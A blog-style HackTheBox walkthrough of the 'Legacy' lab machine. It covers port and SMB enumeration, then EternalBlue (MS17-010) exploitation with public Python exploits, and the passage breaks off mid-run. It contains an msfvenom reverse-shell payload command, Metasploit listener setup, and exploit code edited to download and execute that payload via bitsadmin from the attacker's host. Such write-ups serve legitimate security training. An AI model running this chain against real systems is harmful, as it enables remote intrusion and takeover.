---
layout: post
title: "Legacy Writeup - HackTheBox"
category: HackTheBox
---
## HTB - Legacy

New day, new box! I decided to go for a windows machine since my first one was a gnu+linux one. As usual I roughly follow the [kali method](https://securityonline.info/penetration-testing-kali-linux-methodology/) while cracking boxes. So here we go. Start with pinging ofcourse:

```
kali@kali:~$ ping 10.129.1.111
PING 10.129.1.111 (10.129.1.111) 56(84) bytes of data.
64 bytes from 10.129.1.111: icmp_seq=1 ttl=127 time=13.2 ms
64 bytes from 10.129.1.111: icmp_seq=2 ttl=127 time=13.0 ms
^C
--- 10.129.1.111 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1004ms
rtt min/avg/max/mdev = 12.984/13.090/13.197/0.106 ms
```

### Enumeration

```
root@kali:/home/kali/Desktop/HTB/machines/legacy# nmap -sS -sV 10.129.1.111 | tee firstnmap.txt
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-11 06:59 EST
Nmap scan report for 10.129.1.111
Host is up (0.014s latency).
Not shown: 997 filtered ports
PORT     STATE  SERVICE       VERSION
139/tcp  open   netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open   microsoft-ds  Microsoft Windows XP microsoft-ds
3389/tcp closed ms-wbt-server
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.52 seconds

```

```
root@kali:/home/kali/Desktop/HTB/machines/legacy# nmap -A 10.129.1.111 | tee secondnmap.txt
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-11 06:59 EST
Nmap scan report for 10.129.1.111
Host is up (0.014s latency).
Not shown: 997 filtered ports
PORT     STATE  SERVICE       VERSION
139/tcp  open   netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open   microsoft-ds  Windows XP microsoft-ds
3389/tcp closed ms-wbt-server
Device type: general purpose|specialized
Running (JUST GUESSING): Microsoft Windows XP|2003|2000|2008 (94%), General Dynamics embedded (88%)
OS CPE: cpe:/o:microsoft:windows_xp::sp3 cpe:/o:microsoft:windows_server_2003::sp1 cpe:/o:microsoft:windows_server_2003::sp2 cpe:/o:microsoft:windows_2000::sp4 cpe:/o:microsoft:windows_server_2008::sp2
Aggressive OS guesses: Microsoft Windows XP SP3 (94%), Microsoft Windows Server 2003 SP1 or SP2 (92%), Microsoft Windows XP (92%), Microsoft Windows Server 2003 SP2 (92%), Microsoft Windows XP SP2 or Windows Server 2003 (91%), Microsoft Windows 2003 SP2 (90%), Microsoft Windows 2000 SP4 (90%), Microsoft Windows XP Professional SP3 (90%), Microsoft Windows XP SP2 (90%), Microsoft Windows XP SP2 or SP3 (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
|_clock-skew: mean: 5d00h57m39s, deviation: 1h24m51s, median: 4d23h57m39s
|_nbstat: NetBIOS name: LEGACY, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:b7:4d (VMware)
| smb-os-discovery: 
|   OS: Windows XP (Windows 2000 LAN Manager)
|   OS CPE: cpe:/o:microsoft:windows_xp::-
|   Computer name: legacy
|   NetBIOS computer name: LEGACY\x00
|   Workgroup: HTB\x00
|_  System time: 2021-02-16T15:57:31+02:00
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)

TRACEROUTE (using port 3389/tcp)
HOP RTT      ADDRESS
1   13.02 ms 10.10.14.1
2   13.61 ms 10.129.1.111

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 65.59 seconds

```

After these nmap scans my interest was aroused by ms-wbt-server. Since I did not know this software. It seems to be some kind of RDP software and can be enummed as described in [this blog](https://book.hacktricks.xyz/pentesting/pentesting-rdp). So lets give it a try:

```
root@kali:/home/kali/Desktop/HTB/machines/legacy# nmap --script "rdp-enum-encryption or rdp-vuln-ms12-020 or rdp-ntlm-info" -p 3389 -T4 10.129.1.111 | tee thirdnmap.txt
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-11 07:09 EST
Nmap scan report for 10.129.1.111
Host is up (0.015s latency).

PORT     STATE  SERVICE
3389/tcp closed ms-wbt-server

Nmap done: 1 IP address (1 host up) scanned in 0.36 seconds
```

But no luck so far. So I decided to go back to the good ol' SMB enum attempts:

```
root@kali:/home/kali/Desktop/HTB/machines/legacy# nmblookup -A 10.129.1.111 | tee nmblookup.txt && smbclient //MOUNT/share -I 10.129.1.111 -N | tee smbclient.txt && rpcclient -U "" 10.129.1.111 | tee rpcclient.txt && enum4linux 10.129.1.111 | tee enum4linux.txt
Looking up status of 10.129.1.111
    LEGACY          <00> -         B <ACTIVE> 
    LEGACY          <20> -         B <ACTIVE> 
    HTB             <00> - <GROUP> B <ACTIVE> 

    MAC Address = 00-50-56-B9-B7-4D

protocol negotiation failed: NT_STATUS_IO_TIMEOUT
Cannot connect to server.  Error was NT_STATUS_IO_TIMEOUT
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Thu Feb 11 07:14:51 2021

 ========================== 
|    Target Information    |
 ========================== 
Target ........... 10.129.1.111
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ==================================================== 
|    Enumerating Workgroup/Domain on 10.129.1.111    |
 ==================================================== 
[+] Got domain/workgroup name: HTB

 ============================================ 
|    Nbtstat Information for 10.129.1.111    |
 ============================================ 
Looking up status of 10.129.1.111
    LEGACY          <00> -         B <ACTIVE>  Workstation Service
    LEGACY          <20> -         B <ACTIVE>  File Server Service
    HTB             <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name

    MAC Address = 00-50-56-B9-B7-4D

 ===================================== 
|    Session Check on 10.129.1.111    |
 ===================================== 
[E] Server doesn't allow session using username '', password ''.  Aborting remainder of tests.

```

huhm okay, did not get much smarter as result of these SMB enum attempts. But I do see some SMB workgroups now. Then the lightning hit me, I am only scanning TCP ports, I should scan UDP as well. Here is the output:

```
root@kali:/home/kali/Desktop/HTB/machines/legacy# nmap -sT -sU 10.129.1.111 | tee fourthnmap.txt
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-11 07:21 EST
Nmap scan report for 10.129.1.111
Host is up (0.014s latency).
Not shown: 1000 open|filtered ports, 997 filtered ports
PORT     STATE  SERVICE
139/tcp  open   netbios-ssn
445/tcp  open   microsoft-ds
3389/tcp closed ms-wbt-server

Nmap done: 1 IP address (1 host up) scanned in 26.51 seconds

```

Sadly not much more info then I already had. And then I remembered a vuln called Eternal blue being related to SMB services like netbios-ssn and microsoft-ds. So I went on and ran NMAP for that vuln:

```
root@kali:/home/kali/Desktop/HTB/machines/legacy# nmap -p 139 --script=smb-vuln-ms17-010.nse 10.129.1.111 | tee fifthnmap.txt
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-11 07:37 EST
Nmap scan report for 10.129.1.111
Host is up (0.014s latency).

PORT    STATE SERVICE
139/tcp open  netbios-ssn

Host script results:
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx

Nmap done: 1 IP address (1 host up) scanned in 0.49 seconds
```
```
root@kali:/home/kali/Desktop/HTB/machines/legacy# nmap -p 445 --script=smb-vuln-ms17-010.nse 10.129.1.111 | tee sixthnmap.txt
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-11 07:37 EST
Nmap scan report for 10.129.1.111
Host is up (0.014s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143

Nmap done: 1 IP address (1 host up) scanned in 0.49 seconds

```

At this point I made the decision to squeeze the lemons I had, and went on listing some exploits with what I knew about this system.

### Find the exploit 🔍

Basicly I started google-ing by the following keyword combinations:

- softwarename + softwareversion + exploit
- softwarename + softwareversion + exploit + github
- softwarename + softwareversion + github
- softwarename + softwareversion + exploitdb
- softwarename + softwareversion + exploit + exploitdb
- softwarename + softwareversion

#### ms-wbt-server

- [Eventhough the nmap scan for this vuln was unsuccesfull a closed port does not mean this software is not vulnerable for this exploit. So I might give it a try](https://nmap.org/nsedoc/scripts/rdp-vuln-ms12-020.html)

#### microsoft:windows_xp::sp3

- Thanks to [this post](https://www.reddit.com/r/netsecstudents/comments/bnjah4/using_metasploit_to_exploit_windows_xp_sp3/) if found [this exploit](https://github.com/hanshaze/MS17-010-EternalBlue-WinXP-Win10) which ill be using.
- [Eternalblue in python](https://github.com/REPTILEHAUS/Eternal-Blue)
- [This nifty buffer overflow](https://www.cvebase.com/cve/2010/3227)

If none of the exploits above work ill come back and list some more. If this text is still visible one of the exploits above did the trick.

#### Microsoft Windows netbios-ssn

#### Windows XP microsoft-ds

### Exploitation galore 🔥

As I said earlier, I am trying to mimic a scenario that looks like the actual OSCP more and more along the way of my 20 weeks. Therefore I will use non metasploit exploits more then the ones I find for metasploit. Though I do wonder if the restrictions for metasploit only count for the interface or also for the scripts that are used in metasploit itself. Since I do remember metasploit storing the scripts it uses somewhere on the file system itself. Anyways listed below are my exploitation attempts.

#### Eternal Blue

I like to start with the most promising exploit so I dont waste time on exploits that will take me more time. I dont have that much time during the OSCP exam either. I am more familiar to python then I am to ruby therefore ill be starting with [this exploit](https://github.com/REPTILEHAUS/Eternal-Blue)

```
root@kali:/home/kali/Desktop/HTB/machines/legacy/Eternal-Blue-master# ./start.sh 
##############################################################
#################### MS17-010 SMB EXPLOIT ####################
####### Generating Shellcode for x64 + x86 EternalBlue #######
################ x86 exploit uses Port: 4444 #################
################ x64 exploit uses Port: 5555 #################
##############################################################


Step 1 of 7..
1. GENERATING MSF SHELLCODE x64

Step 2 of 7..
2. GENERATING MSF SHELLCODE x86

Step 3 of 7..
3. GENERATING nasm SHELLCODE x64

Step 4 of 7..
4. GENERATING nasm SHELLCODE x86

Step 5 of 7..
5. Combining nasm and MSF SHELLCODE to x86 binary

Step 6 of 7..
6. Combining nasm and MSF SHELLCODE to x64 binary

Step 7 of 7..
7. Finally Combining all of our binaries into 1 beast shellcode file for all architectures

Creating x86 MSF quick launch file..

Creating x64 MSF quick launch file..

FINISHED!!!!...

Usage INSTRUCTIONS
Now you need to open 2 terminals and execute the following to active metasploit listeners..
for both x86 and x64 OS Architectures. If you already know the Systems Arch then you can just
use the following relevant metasploit run file we generated.


For x64 bit Architecture:  msfconsole -r "/home/kali/Desktop/HTB/machines/legacy/Eternal-Blue-master/output/EternalBlueX64.rc"

For x86 bit Architecture:  msfconsole -r "/home/kali/Desktop/HTB/machines/legacy/Eternal-Blue-master/output/EternalBlueX86.rc"

 Now exploit using the Windows 7 script by running this: 


python /home/kali/Desktop/HTB/machines/legacy/Eternal-Blue-master/eternalblue_exploit7.py 10.129.1.111 /home/kali/Desktop/HTB/machines/legacy/Eternal-Blue-master/bin/sc_all.bin 3

```

Dangit I hate metasploit, well guess I have no choice do I....

```
root@kali:/home/kali# msfconsole -r "/home/kali/Desktop/HTB/machines/legacy/Eternal-Blue-master/output/EternalBlueX64.rc"
                                                  

*Neutrino_Cannon*PrettyBeefy*PostalTime*binbash*deadastronauts*EvilBunnyWrote*L1T*Mail.ru*() { :;}; echo vulnerable*
*Team sorceror*ADACTF*BisonSquad*socialdistancing*LeukeTeamNaam*OWASP Moncton*Alegori*exit*Vampire Bunnies*APT593*
*QuePasaZombiesAndFriends*NetSecBG*coincoin*ShroomZ*Slow Coders*Scavenger Security*Bruh*NoTeamName*Terminal Cult*
*edspiner*BFG*MagentaHats*0x01DA*Kaczuszki*AlphaPwners*FILAHA*Raffaela*HackSurYvette*outout*HackSouth*Corax*yeeb0iz*
*SKUA*Cyber COBRA*flaghunters*0xCD*AI Generated*CSEC*p3nnm3d*IFS*CTF_Circle*InnotecLabs*baadf00d*BitSwitchers*0xnoobs*
*ItPwns - Intergalactic Team of PWNers*PCCsquared*fr334aks*runCMD*0x194*Kapital Krakens*ReadyPlayer1337*Team 443*
*H4CKSN0W*InfOUsec*CTF Community*DCZia*NiceWay*0xBlueSky*ME3*Tipi'Hack*Porg Pwn Platoon*Hackerty*hackstreetboys*
*ideaengine007*eggcellent*H4x*cw167*localhorst*Original Cyan Lonkero*Sad_Pandas*FalseFlag*OurHeartBleedsOrange*SBWASP*
*Cult of the Dead Turkey*doesthismatter*crayontheft*Cyber Mausoleum*scripterz*VetSec*norbot*Delta Squad Zero*Mukesh*
*x00-x00*BlackCat*ARESx*cxp*vaporsec*purplehax*RedTeam@MTU*UsalamaTeam*vitamink*RISC*forkbomb444*hownowbrowncow*
*etherknot*cheesebaguette*downgrade*FR!3ND5*badfirmware*Cut3Dr4g0n*dc615*nora*Polaris One*team*hail hydra*Takoyaki*
*Sudo Society*incognito-flash*TheScientists*Tea Party*Reapers of Pwnage*OldBoys*M0ul3Fr1t1B13r3*bearswithsaws*DC540*
*iMosuke*Infosec_zitro*CrackTheFlag*TheConquerors*Asur*4fun*Rogue-CTF*Cyber*TMHC*The_Pirhacks*btwIuseArch*MadDawgs*
*HInc*The Pighty Mangolins*CCSF_RamSec*x4n0n*x0rc3r3rs*emehacr*Ph4n70m_R34p3r*humziq*Preeminence*UMGC*ByteBrigade*
*TeamFastMark*Towson-Cyberkatz*meow*xrzhev*PA Hackers*Kuolema*Nakateam*L0g!c B0mb*NOVA-InfoSec*teamstyle*Panic*
*B0NG0R3*                                                                                    *Les Cadets Rouges*buf*
*Les Tontons Fl4gueurs*                                                                      *404 : Flag Not Found*
*' UNION SELECT 'password*      _________                __                                  *OCD247*Sparkle Pony* 
*burner_herz0g*                 \_   ___ \_____  _______/  |_ __ _________   ____            *Kill$hot*ConEmu*
*here_there_be_trolls*          /    \  \/\__  \ \____ \   __\  |  \_  __ \_/ __ \           *;echo"hacked"*
*r4t5_*6rung4nd4*NYUSEC*        \     \____/ __ \|  |_> >  | |  |  /|  | \/\  ___/           *karamel4e*
*IkastenIO*TWC*balkansec*        \______  (____  /   __/|__| |____/ |__|    \___  >          *cybersecurity.li*
*TofuEelRoll*Trash Pandas*              \/     \/|__|                           \/           *OneManArmy*cyb3r_w1z4rd5*
*Astra*Got Schwartz?*tmux*                  ___________.__                                   *AreYouStuck*Mr.Robot.0*
*\nls*Juicy white peach*                    \__    ___/|  |__   ____                         *EPITA Rennes*
*HackerKnights*                               |    |   |  |  \_/ __ \                        *guildOfGengar*Titans*
*Pentest Rangers*                             |    |   |   Y  \  ___/                        *The Libbyrators*
*placeholder name*bitup*                      |____|   |___|  /\___  >                       *JeffTadashi*Mikeal*
*UCASers*onotch*                                            \/     \/                        *ky_dong_day_song*
*NeNiNuMmOk*                              ___________.__                                     *JustForFun!*
*Maux de tête*LalaNG*                     \_   _____/|  | _____     ____                     *g3tsh3Lls0on*
*crr0tz*z3r0p0rn*clueless*                 |    __)  |  | \__  \   / ___\                    *Phở Đặc Biệt*Paradox*
*HackWara*                                 |     \   |  |__/ __ \_/ /_/  >                   *KaRIPux*inf0sec*
*Kugelschreibertester*                     \___  /   |____(____  /\___  /                    *bluehens*Antoine77*
*icemasters*                                   \/              \//_____/                     *genxy*TRADE_NAMES*
*Spartan's Ravens*                       _______________   _______________                   *BadByte*fontwang_tw*
*g0ldd1gg3rs*pappo*                     \_____  \   _  \  \_____  \   _  \                   *ghoti*
*Les CRACKS*c0dingRabbits*               /  ____/  /_\  \  /  ____/  /_\  \                  *LinuxRiders*   
*2Cr4Sh*RecycleBin*                     /       \  \_/   \/       \  \_/   \                 *Jalan Durian*
*ExploitStudio*                         \_______ \_____  /\_______ \_____  /                 *WPICSC*logaritm*
*Car RamRod*0x41414141*                         \/     \/         \/     \/                  *Orv1ll3*team-fm4dd*
*Björkson*FlyingCircus*                                                                      *PwnHub*H4X0R*Yanee*
*Securifera*hot cocoa*                                                                       *Et3rnal*PelarianCP*
*n00bytes*DNC&G*guildzero*dorko*tv*42*{EHF}*CarpeDien*Flamin-Go*BarryWhite*XUcyber*FernetInjection*DCcurity*
*Mars Explorer*ozen_cfw*Fat Boys*Simpatico*nzdjb*Isec-U.O*The Pomorians*T35H*H@wk33*JetJ*OrangeStar*Team Corgi*
*D0g3*0itch*OffRes*LegionOfRinf*UniWA*wgucoo*Pr0ph3t*L0ner*_n00bz*OSINT Punchers*Tinfoil Hats*Hava*Team Neu*
*Cyb3rDoctor*Techlock Inc*kinakomochi*DubbelDopper*bubbasnmp*w*Gh0st$*tyl3rsec*LUCKY_CLOVERS*ev4d3rx10-team*ir4n6*
*PEQUI_ctf*HKLBGD*L3o*5 bits short of a byte*UCM*ByteForc3*Death_Geass*Stryk3r*WooT*Raise The Black*CTErr0r*
*Individual*mikejam*Flag Predator*klandes*_no_Skids*SQ.*CyberOWL*Ironhearts*Kizzle*gauti*
*San Antonio College Cyber Rangers*sam.ninja*Akerbeltz*cheeseroyale*Ephyra*sard city*OrderingChaos*Pickle_Ricks*
*Hex2Text*defiant*hefter*Flaggermeister*Oxford Brookes University*OD1E*noob_noob*Ferris Wheel*Ficus*ONO*jameless*
*Log1c_b0mb*dr4k0t4*0th3rs*dcua*cccchhhh6819*Manzara's Magpies*pwn4lyfe*Droogy*Shrubhound Gang*ssociety*HackJWU*
*asdfghjkl*n00bi3*i-cube warriors*WhateverThrone*Salvat0re*Chadsec*0x1337deadbeef*StarchThingIDK*Tieto_alaviiva_turva*
*InspiV*RPCA Cyber Club*kurage0verfl0w*lammm*pelicans_for_freedom*switchteam*tim*departedcomputerchairs*cool_runnings*
*chads*SecureShell*EetIetsHekken*CyberSquad*P&K*Trident*RedSeer*SOMA*EVM*BUckys_Angels*OrangeJuice*DemDirtyUserz*
*OpenToAll*Born2Hack*Bigglesworth*NIS*10Monkeys1Keyboard*TNGCrew*Cla55N0tF0und*exploits33kr*root_rulzz*InfosecIITG*
*superusers*H@rdT0R3m3b3r*operators*NULL*stuxCTF*mHackresciallo*Eclipse*Gingabeast*Hamad*Immortals*arasan*MouseTrap*
*damn_sadboi*tadaaa*null2root*HowestCSP*fezfezf*LordVader*Fl@g_Hunt3rs*bluenet*P@Ge2mE*



       =[ metasploit v6.0.29-dev                          ]
+ -- --=[ 2098 exploits - 1129 auxiliary - 357 post       ]
+ -- --=[ 592 payloads - 45 encoders - 10 nops            ]
+ -- --=[ 7 evasion                                       ]

Metasploit tip: View a module's description using 
info, or the enhanced version in your browser with 
info -d

[*] Processing /home/kali/Desktop/HTB/machines/legacy/Eternal-Blue-master/output/EternalBlueX64.rc for ERB directives.
resource (/home/kali/Desktop/HTB/machines/legacy/Eternal-Blue-master/output/EternalBlueX64.rc)> use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
resource (/home/kali/Desktop/HTB/machines/legacy/Eternal-Blue-master/output/EternalBlueX64.rc)> set PAYLOAD windows/x64/shell_reverse_tcp
PAYLOAD => windows/x64/shell_reverse_tcp
resource (/home/kali/Desktop/HTB/machines/legacy/Eternal-Blue-master/output/EternalBlueX64.rc)> set EXITFUNC thread
EXITFUNC => thread
resource (/home/kali/Desktop/HTB/machines/legacy/Eternal-Blue-master/output/EternalBlueX64.rc)> set ExitOnSession false
ExitOnSession => false
resource (/home/kali/Desktop/HTB/machines/legacy/Eternal-Blue-master/output/EternalBlueX64.rc)> set LHOST 10.10.14.33
LHOST => 10.10.14.33
resource (/home/kali/Desktop/HTB/machines/legacy/Eternal-Blue-master/output/EternalBlueX64.rc)> set LPORT 5555
LPORT => 5555
resource (/home/kali/Desktop/HTB/machines/legacy/Eternal-Blue-master/output/EternalBlueX64.rc)> exploit -j
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 10.10.14.33:5555 

```

Okay seems good, lets execute the last step:

```
root@kali:/home/kali/Desktop/HTB/machines/legacy/Eternal-Blue-master# python /home/kali/Desktop/HTB/machines/legacy/Eternal-Blue-master/eternalblue_exploit7.py 10.129.1.111 /home/kali/Desktop/HTB/machines/legacy/Eternal-Blue-master/bin/sc_all.bin 3
shellcode size: 2203
numGroomConn: 3
Target OS: Windows 5.1
This exploit does not support this target
root@kali:/home/kali/Desktop/HTB/machines/legacy/Eternal-Blue-master# python /home/kali/Desktop/HTB/machines/legacy/Eternal-Blue-master/eternalblue_exploit8.py 10.129.1.111 /home/kali/Desktop/HTB/machines/legacy/Eternal-Blue-master/bin/sc_all.bin 3
shellcode size: 2203
numGroomConn: 3
Target OS: Windows 5.1
This exploit does not support this target

```

Aaahhhhh beans, not working. Okay lets find an alternative which suits Windows XP this time.
[This archived exploit](https://github.com/mez-0/MS17-010-Python) seems to have some potential. Lets give it a try:

```
root@kali:/home/kali/Desktop/HTB/machines/legacy/MS17-010-Python# python zzz_checker.py -t 10.129.1.111

███╗   ███╗███████╗ ██╗███████╗       ██████╗  ██╗ ██████╗ ...zzz_checker
████╗ ████║██╔════╝███║╚════██║      ██╔═████╗███║██╔═████╗
██╔████╔██║███████╗╚██║    ██╔╝█████╗██║██╔██║╚██║██║██╔██║
██║╚██╔╝██║╚════██║ ██║   ██╔╝ ╚════╝████╔╝██║ ██║████╔╝██║
██║ ╚═╝ ██║███████║ ██║   ██║        ╚██████╔╝ ██║╚██████╔╝
╚═╝     ╚═╝╚══════╝ ╚═╝   ╚═╝         ╚═════╝  ╚═╝ ╚═════╝ 

[11/02/21, 13:51:13] >> Attempting to connect to 10.129.1.111
[11/02/21, 13:51:13] >> Successfully connected to 10.129.1.111
[11/02/21, 13:51:13] >> Attempting to authenticate to 10.129.1.111
[11/02/21, 13:51:13] >> Successfully authenticated to 10.129.1.111
[11/02/21, 13:51:13] >> Attempting to get OS for 10.129.1.111
[11/02/21, 13:51:13] >> Got Operting System: Windows 5.1
[11/02/21, 13:51:13] >> Attempting to connect to \\10.129.1.111\IPC$
[11/02/21, 13:51:13] >> Successfully connected to \\10.129.1.111\IPC$
[11/02/21, 13:51:13] >> Testing if 10.129.1.111 is vulnerable...
[11/02/21, 13:51:13] >> [10.129.1.111] VULNERABLE
[11/02/21, 13:51:13] >> Checking pipes on 10.129.1.111
[11/02/21, 13:51:13] >> Got error whilst binding to rpc: Bind context 1 rejected: provider_rejection; proposed_transfer_syntaxes_not_supported
[11/02/21, 13:51:13] >> Got SMB Session error whilst connecting SMB SessionError: STATUS_ACCESS_DENIED({Access Denied} A process has requested access to an object but has not been granted those access rights.)
[11/02/21, 13:51:13] >> Got SMB Session error whilst connecting SMB SessionError: STATUS_ACCESS_DENIED({Access Denied} A process has requested access to an object but has not been granted those access rights.)
[11/02/21, 13:51:13] >> Got SMB Session error whilst connecting SMB SessionError: STATUS_ACCESS_DENIED({Access Denied} A process has requested access to an object but has not been granted those access rights.)
[11/02/21, 13:51:13] >> Got SMB Session error whilst connecting SMB SessionError: STATUS_OBJECT_NAME_NOT_FOUND(The object name is not found.)

Results:
10.129.1.111: ['spoolss']

```

Huhm okay so the standard SMB pipes get some access denied errors. I think I have to connect to a specific pipe since the zzz_checker gave me:

```
Results:
10.129.1.111: ['spoolss']
```

That is when I tried to run zzz_exploit in the following manner:

```
root@kali:/home/kali/Desktop/HTB/machines/legacy/MS17-010-Python# python zzz_exploit.py -t 10.129.1.111 -P 'spoolss' --command 'whoami'

███╗   ███╗███████╗ ██╗███████╗       ██████╗  ██╗ ██████╗ ...zzz_exploit
████╗ ████║██╔════╝███║╚════██║      ██╔═████╗███║██╔═████╗
██╔████╔██║███████╗╚██║    ██╔╝█████╗██║██╔██║╚██║██║██╔██║
██║╚██╔╝██║╚════██║ ██║   ██╔╝ ╚════╝████╔╝██║ ██║████╔╝██║
██║ ╚═╝ ██║███████║ ██║   ██║        ╚██████╔╝ ██║╚██████╔╝
╚═╝     ╚═╝╚══════╝ ╚═╝   ╚═╝         ╚═════╝  ╚═╝ ╚═════╝ 

[11/02/21, 14:27:27] >> Using specified pipe: [spoolss]
[11/02/21, 14:27:27] >> Connecting to: [10.129.1.111]
[11/02/21, 14:27:27] >> Attempting to authenticate with null sessions
[11/02/21, 14:27:27] >> Successfully authenticated as :
[11/02/21, 14:27:27] >> OS: Windows 5.1
[11/02/21, 14:27:27] >> Checking the named pipes...
[11/02/21, 14:27:27] >> Groom Packets
[11/02/21, 14:27:27] >> Attempting to control next transaction x86
[11/02/21, 14:27:27] >> Successfully controlled one transaction!
[11/02/21, 14:27:27] >> Modifying parameter count to 0xffffffff to write backwards
[11/02/21, 14:27:27] >> Leaking next transaction
[11/02/21, 14:27:27] >> Connection: 0x82153578
[11/02/21, 14:27:27] >> Session: 0xe1a32918
[11/02/21, 14:27:27] >> Flink: 0x7bd48
[11/02/21, 14:27:27] >> InData: 0x7ae28
[11/02/21, 14:27:27] >> MID: 0xa
[11/02/21, 14:27:27] >> Trans1: 0x78b50
[11/02/21, 14:27:27] >> Trans2: 0x7ac90
[11/02/21, 14:27:27] >> modify transaction struct for arbitrary read/write
[11/02/21, 14:27:27] >> Creating SYSTEM Session
[11/02/21, 14:27:27] >> Current Token Addr: 0xe218e030
[11/02/21, 14:27:28] >> userAndGroupCount: 0x3
[11/02/21, 14:27:28] >> userAndGroupsAddr: 0xe218e0d0
[11/02/21, 14:27:28] >> Overwriting Token [UserAndGroups]
[11/02/21, 14:27:28] >> Writing command to service: whoami
[11/02/21, 14:27:28] >> Opening SVCManager ON 10.129.1.111...
[11/02/21, 14:27:28] >> Creating service [sNdM]
[11/02/21, 14:27:28] >> Starting service [sNdM]
[11/02/21, 14:27:28] >> SCMR SessionError: code: 0x2 - ERROR_FILE_NOT_FOUND - The system cannot find the file specified.
[11/02/21, 14:27:28] >> Removing service [sNdM]
[11/02/21, 14:27:28] >> Exploit finished!

```

Unfortunatly it did not execute my command. Which made consider using a different Eternal Blue exploit. I know this should be possible since I had $IPC access. I tried [this guide and exploit](https://null-byte.wonderhowto.com/how-to/manually-exploit-eternalblue-windows-server-using-ms17-010-python-exploit-0195414/)

```
root@kali:/home/kali/Desktop/HTB/machines/legacy/MS17-010-Python# python 42315.py 10.129.1.111 spoolss
Target OS: Windows 5.1
Groom packets
attempt controlling next transaction on x86
success controlling one transaction
modify parameter count to 0xffffffff to be able to write backward
leak next transaction
CONNECTION: 0x81ff13e0
SESSION: 0xe2196380
FLINK: 0x7bd48
InData: 0x7ae28
MID: 0xa
TRANS1: 0x78b50
TRANS2: 0x7ac90
modify transaction struct for arbitrary read/write
make this SMB session to be SYSTEM
current TOKEN addr: 0xe1544728
userAndGroupCount: 0x3
userAndGroupsAddr: 0xe15447c8
overwriting token UserAndGroups
creating file c:\pwned.txt on the target
Done

```

Okay so now I placed a file on the C drive of the machine. Great lets think, what can I do now. If I must believe the guide for this exploit I can start a local apache server after I generate some shellcode via msfvenom. Then transfer a payload to the machine via the exploit to establish a reverse shell. Imma try that:

```
root@kali:/home/kali/Desktop/HTB/machines/legacy/MS17-010-Python# msfvenom -a x64 --platform Windows -p windows/x64/meterpreter/reverse_tcp lhost=10.10.14.33 lport=4321 -e x64/xor -i 5 -f exe -o /var/www/html/sc.exe
Found 1 compatible encoders
Attempting to encode payload with 5 iterations of x64/xor
x64/xor succeeded with size 551 (iteration=0)
x64/xor succeeded with size 591 (iteration=1)
x64/xor succeeded with size 631 (iteration=2)
x64/xor succeeded with size 671 (iteration=3)
x64/xor succeeded with size 711 (iteration=4)
x64/xor chosen with final size 711
Payload size: 711 bytes
Final size of exe file: 7168 bytes
Saved as: /var/www/html/sc.exe

```

After that we start apache2:

```
server apache2 start
```

And then we edit the exploit with a command that executes in order to download the binary from our webserver. I uncommented the lines that say service_exec. These lines make sure te exe is transfered from our webserver to the box and then executed (I also uncommented the part where the textfile is creted on the box):


```
def smb_pwn(conn, arch):
        smbConn = conn.get_smbconnection()
        
        #print('creating file c:\\pwned.txt on the target')
        #tid2 = smbConn.connectTree('C$')
        #fid2 = smbConn.createFile(tid2, '/pwned.txt')
        #smbConn.closeFile(tid2, fid2)
        #smbConn.disconnectTree(tid2)

        #smb_send_file(smbConn, sys.argv[0], 'C', '/exploit.py')
        service_exec(conn, r'cmd /c bitsadmin /transfer pwn /download http://10.10.14.33/sc.exe C:\sc.exe')
        service_exec(conn, r'cmd /c /sc.exe')
        # Note: there are many methods to get shell over SMB admin session
        # a simple method to get shell (but easily to be detected by AV) is
        # executing binary generated by "msfvenom -f exe-service ..."

```
Result:

```
root@kali:/home/kali/Desktop/HTB/machines/legacy/MS17-010-Python# python 42315.py 10.129.1.111 browser
Target OS: Windows 5.1
Groom packets
attempt controlling next transaction on x86
success controlling one transaction
